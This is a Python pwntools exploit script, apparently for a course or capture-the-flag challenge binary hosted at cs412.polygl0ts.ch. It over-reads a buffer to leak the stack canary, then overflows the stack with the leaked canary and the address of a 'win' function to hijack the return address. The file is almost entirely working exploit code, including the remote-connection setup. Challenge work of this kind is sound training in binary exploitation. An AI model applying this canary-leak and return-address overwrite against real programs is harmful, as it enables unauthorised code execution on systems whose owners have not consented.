#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template exe
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("exe")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("cs412.polygl0ts.ch", 9002)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
break vulnerable
continue
break win
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

if args.GDB:
    io.interactive()

log.info(io.recv())
io.sendline(b"0") # ask for read
log.info(io.recv())
io.sendline(b"13") # read 13*8 bytes, full buffer + canary

canary = io.recv()[:8]

log.info("Canary found :" + str(canary[:8]))
log.info(canary * 14 + p64(exe.symbols["win"]) * 3)

io.sendline(b"1") # ask for write 
io.sendline(b"128") # write 128 bytes (make sure to go far enough)
io.sendline(canary * 14 + p64(exe.symbols["win"]) * 3) # put the canary in place and override return address with `win` address

io.sendline(b"2") # leave the function to go to return address

io.interactive()
